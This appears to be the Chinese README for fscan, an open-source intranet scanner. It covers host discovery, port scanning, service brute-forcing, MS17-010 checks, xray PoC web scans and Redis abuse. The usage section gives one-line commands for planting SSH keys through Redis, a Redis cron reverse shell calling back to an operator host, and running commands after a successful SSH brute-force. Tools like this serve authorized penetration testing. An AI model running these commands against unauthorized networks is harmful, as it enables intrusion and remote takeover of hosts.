# fscan

# 简介
一款内网扫描工具，方便一键大保健。    
支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息、web漏洞扫描等。  
趁着最近有空，用go把f-scrack重构了一遍。使用go来编写，也有更好的扩展性及兼容性。  
还在逐步增加功能，欢迎各位师傅提意见。


## why
为什么有LadonGo、x-crack 、tscan、Gscan 这些工具了还要写fscan  

答：  
   因为用习惯了f-scrack，习惯一条命令跑完所有模块，省去一个个模块单独调用的时间，当然我附加了-m 指定模块的功能。

## 最近更新
[+] 2021/2/5 修改icmp发包模式,更适合大规模探测。   
   修改报错提示,-debug时,如果10秒内没有新的进展,每隔10秒就会打印一下当前进度    
[+] 2020/12/12 已加入yaml解析引擎,支持xray的Poc,默认使用所有Poc(已对xray的poc进行了筛选),可以使用-pocname weblogic,只使用某种或某个poc。需要go版本1.16以上,只能自行编译最新版go来进行测试    
[+] 2020/12/6 优化icmp模块,新增-domain 参数(用于smb爆破模块,适用于域用户)  
[+] 2020/12/03 优化ip段处理模块、icmp、端口扫描模块。新增支持192.168.1.1-192.168.255.255。  
[+] 2020/11/17 增加-ping 参数,作用是存活探测模块用ping代替icmp发包。   
[+] 2020/11/17 增加WebScan模块,新增shiro简单识别。https访问时,跳过证书认证。将服务模块和web模块的超时分开,增加-wt 参数(WebTimeout)。    
[+] 2020/11/16 对icmp模块进行优化,增加-it 参数(IcmpThreads),默认11000,适合扫B段  
[+] 2020/11/15 支持ip以文件导入,-hs ip.txt,并对去重做了处理

## usege
简单用法
``` 
go run main.go -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写私钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
```
```
-h 192.168.1.1/24 (C段)  
-h 192.168.1.1/16 (B段)
-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
-hf ip.txt  (以文件导入)
```


完整参数
```
  -Num int
        poc rate (default 20)
  -c string
        exec command (ssh)
  -domain string
        smb domain
  -h string
        IP address of the host you want to scan,for example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        host file, -hs ip.txt
  -it int
        Icmp Threads nums (default 11000)
  -m string
        Select scan type ,as: -m ssh (default "all")
  -no
        not to save output log
  -nopoc
        not to scan web vul
  -np
        not to ping
  -o string
        Outputfile (default "result.txt")
  -p string
        Select a port,for example: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,11211,27017")
  -ping
        using ping replace icmp
  -pocname string
        use the pocs these contain pocname, -pocname weblogic
  -proxy string
        set poc proxy, -proxy http://127.0.0.1:8080
  -pwd string
        password
  -pwdf string
        password file
  -rf string
        redis file to write sshkey file (as: -rf id_rsa.pub)
  -rs string
        redis shell to write cron file (as: -rs 192.168.1.1:6666)
  -t int
        Thread nums (default 200)
  -time int
        Set timeout (default 3)
  -user string
        username
  -userf string
        username file
  -wt int
        Set web timeout (default 3)

```

## 运行截图

`fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写私钥)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc`
![](image/2020-12-12-13-34-44.png)

## 未来计划
[*] 合理输出当前扫描进度  
[*] 增加内网常见高危漏洞  
[*] 增加高危web漏洞扫描  
[*] 师傅们觉得有必要加的漏洞，也可以提issue  


## 参考链接
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc